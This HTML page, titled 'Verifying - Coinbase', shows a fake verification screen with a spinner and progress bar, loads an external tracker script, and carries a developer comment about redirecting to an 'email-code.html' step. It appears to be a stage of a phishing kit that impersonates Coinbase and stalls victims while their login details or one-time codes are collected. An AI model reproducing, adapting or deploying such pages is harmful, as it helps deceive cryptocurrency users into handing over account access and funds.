<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying - Coinbase</title>
    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
    <style>
        /* Reset and Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
            background-color: #0a0b0d;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        /* Header */
        .header {
            padding: 24px 32px;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
            background-color: #0a0b0d;
        }

        .logo-container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .logo {
            height: 32px;
            width: auto;
            display: block;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 120px 24px 80px;
        }

        .verifying-container {
            width: 100%;
            max-width: 440px;
            text-align: center;
        }

        /* Loading Spinner */
        .spinner-container {
            margin-bottom: 32px;
            display: flex;
            justify-content: center;
        }

        .spinner {
            width: 64px;
            height: 64px;
            border: 4px solid #2c2d30;
            border-top-color: #4c6ef5;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Text */
        .verifying-title {
            font-size: 32px;
            font-weight: 600;
            line-height: 1.25;
            margin-bottom: 12px;
            color: #ffffff;
        }

        .verifying-subtitle {
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            color: #9fa3a8;
        }

        /* Progress Bar */
        .progress-container {
            margin-top: 40px;
            width: 100%;
            max-width: 320px;
            margin-left: auto;
            margin-right: auto;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background-color: #2c2d30;
            border-radius: 2px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background-color: #4c6ef5;
            border-radius: 2px;
            animation: progress 3s ease-in-out forwards;
        }

        @keyframes progress {
            from {
                width: 0%;
            }
            to {
                width: 100%;
            }
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .header {
                padding: 20px 20px;
            }

            .logo {
                height: 28px;
            }

            .main-content {
                padding: 100px 20px 60px;
            }

            .verifying-title {
                font-size: 28px;
            }

            .verifying-subtitle {
                font-size: 15px;
            }

            .spinner {
                width: 56px;
                height: 56px;
            }
        }

        @media (max-width: 480px) {
            .verifying-title {
                font-size: 24px;
            }

            .verifying-subtitle {
                font-size: 14px;
            }

            .spinner {
                width: 48px;
                height: 48px;
            }
        }
    </style>

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="logo-container">
            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="verifying-container">
            <!-- Loading Spinner -->
            <div class="spinner-container">
                <div class="spinner"></div>
            </div>

            <!-- Text -->
            <h1 class="verifying-title">Verifying...</h1>
            <p class="verifying-subtitle">Please wait while we verify your information.</p>
        </div>
    </main>

    <script>
        // ============================================
        // DEVELOPER: Define redirect destination here
        // ============================================
        // Example: setTimeout(function() { window.location.href = 'email-code.html'; }, 4000);
        // Page stays on verifying screen indefinitely by default
    </script>
</body>
</html>
